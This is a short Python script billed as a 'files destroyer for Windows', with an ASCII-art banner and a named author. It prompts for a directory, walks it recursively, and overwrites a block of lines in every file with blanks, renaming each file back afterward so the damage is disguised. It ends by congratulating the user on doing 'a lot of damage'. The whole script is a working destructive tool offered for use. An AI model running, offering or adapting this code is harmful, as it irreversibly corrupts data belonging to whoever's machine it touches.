import os
import time
from tqdm import tqdm

os.system('color 02')
print("\n---------------------------------------")
print("-     FILES DESTROYER FOR WINDOWS     -")   
print("---------------------------------------\n")
print("       ---_ ......._-_--.          ")
print("      (|\ /      / /| \  \       ")
print("      /  /     .'  -=-'   `.       ")
print("     /  /    .'             )       ")
print("   _/  /   .'        _.)   /       ")
print("  / o   o        _.-' /  .'       ")
print("  \          _.-'    / .'*|       ")
print("   \______.-'//    .'.' \*|       ")
print("    \|  \ | //   .'.' _ |*|       ")
print("     `   \|//  .'.'_ _ _|*|       ")
print("      .  .// .'.' | _ _ \*|       ")
print("      \`-|\_/ /    \ _ _ \*\       ")
print("       `/'\__/      \ _ _ \*\       ")
print("      /^|            \ _ _ \*       ")
print("     '  `             \ _ _ \             ")
print("                       \_       ")
print("     BY GIULIANO CRENNA\n\n")

directory = input("INTRODUCE DIR TO CORRUPT>> ")

def break_file(file):
    file = str(file)
    new_file =  os.path.splitext(file)[0] + ".txt"
    new_file_ = os.path.split(new_file)
    command = 'ren "{old}" "{new}"'.format(old = file, new = new_file_[1])
    os.system(command)

    session = open(new_file, encoding='cp437')
    strings = session.readlines()
    session.close()

    strings_lenght = len(strings)
    try:
        for i in range(55, 100):
            strings[i] = " "
    except:
        for i in range(0, strings_lenght):
            strings[i] = " "

    
    session = open(new_file, "w", encoding='cp437')
    new_content = "".join(strings)

    session.write(new_content)

    for i in tqdm(range(0, 100), total = 100,
                        desc ="{}".format(os.path.split(file)[1])):
                            time.sleep(.0001)
    print("\t")

    session.close()

    old_file = os.path.split(file)
    command = 'ren "{new}" "{old}"'.format(new = new_file, old = old_file[1])
    os.system(command)

class Corrupter():
    def __init__(self, directory):
        self.directory = directory
    def corrupter(self):
        try:
            self.directory = str(directory)

            for root, _dir, file in os.walk(directory, topdown=False):
                for element in file:
                    str_dir = os.path.join(root, element)
                    break_file(str_dir)

        except Exception as E:
            print(E)
            pass
            
corrupt = Corrupter(dir)
corrupt.corrupter()

input("\n\n DONE! YOU DID A LOT OF DAMAGE\n PRESS ENTER TO LEAVE...")

